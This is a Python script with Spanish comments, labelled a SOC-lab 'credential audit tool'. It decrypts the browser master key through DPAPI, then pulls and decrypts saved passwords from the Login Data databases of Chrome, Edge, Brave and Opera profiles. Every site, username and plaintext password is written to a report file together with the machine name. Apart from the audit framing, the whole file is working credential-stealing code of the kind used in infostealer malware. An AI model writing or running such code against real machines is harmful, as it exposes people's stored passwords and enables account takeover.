import os, json, base64, sqlite3, shutil, win32crypt, sys
try:
    from Crypto.Cipher import AES
except ImportError:
    print("[-] Error: Instale 'pycryptodome' para ejecutar este script de auditoría.")
    sys.exit()

# === [SOC LAB] MULTI-BROWSER CREDENTIAL AUDIT TOOL ===
# Investigación sobre el almacenamiento de secretos en navegadores Chromium
# y el impacto de la nueva protección 'App-Bound Encryption'.
# =====================================================

def get_master_key(path):
    """Extrae y descifra la clave maestra protegida por DPAPI."""
    if not os.path.exists(path): return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_val(buff, key):
    """Descifra valores usando AES-GCM o detecta blindaje App-Bound."""
    try:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        # Manejo de la nueva protección de Chrome 127+
        return "PROTEGIDO_APP_BOUND (Análisis Forense Necesario)"

def analizar_navegador(nombre, ruta_base, reporte):
    """Escanea perfiles de usuario en busca de vulnerabilidades de almacenamiento."""
    reporte.write(f"\n[+] AUDITORÍA DE: {nombre}\n" + "="*40 + "\n")
    
    if not os.path.exists(ruta_base):
        reporte.write(f"[-] {nombre}: No detectado en el sistema.\n")
        return

    key = get_master_key(os.path.join(ruta_base, "Local State"))
    if not key:
        reporte.write(f"[-] Error: No se pudo obtener la Master Key de {nombre}.\n")
        return

    for i in range(5): # Escaneo de perfiles principales
        perfil = "Default" if i == 0 else f"Profile {i}"
        db_path = os.path.join(ruta_base, perfil, "Login Data")
        
        if os.path.exists(db_path):
            try:
                shutil.copy2(db_path, "temp_db")
                conn = sqlite3.connect("temp_db")
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    if row[1] or row[2]:
                        p = decrypt_val(row[2], key)
                        reporte.write(f"Web: {row[0]}\nUser: {row[1]}\nPass: {p}\n\n")
                
                conn.close()
                os.remove("temp_db")
            except Exception as e:
                reporte.write(f"[-] Error en {perfil}: Acceso denegado o base de datos bloqueada.\n")

def main():
    # El reporte se genera dinámicamente en el directorio de ejecución
    log_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "REPORTE_AUDITORIA_BROWSERS.txt")
    
    appdata_l = os.environ.get("LOCALAPPDATA", "")
    appdata_r = os.environ.get("APPDATA", "")

    navs = {
        "Google Chrome": os.path.join(appdata_l, "Google", "Chrome", "User Data"),
        "Microsoft Edge": os.path.join(appdata_l, "Microsoft", "Edge", "User Data"),
        "Brave-Browser": os.path.join(appdata_l, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera Stable": os.path.join(appdata_r, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata_r, "Opera Software", "Opera GX Stable")
    }
    
    with open(log_path, "w", encoding="utf-8") as f:
        f.write("=== PROYECTO AUDITORÍA: EXTRACCIÓN MULTI-BROWSER ===\n")
        f.write(f"Host: {os.environ.get('COMPUTERNAME', 'Unknown')}\n")
        for nombre, ruta in navs.items():
            analizar_navegador(nombre, ruta, f)

    print(f"[OK] Auditoría finalizada. Resultados en: {log_path}")

if __name__ == "__main__":
    main()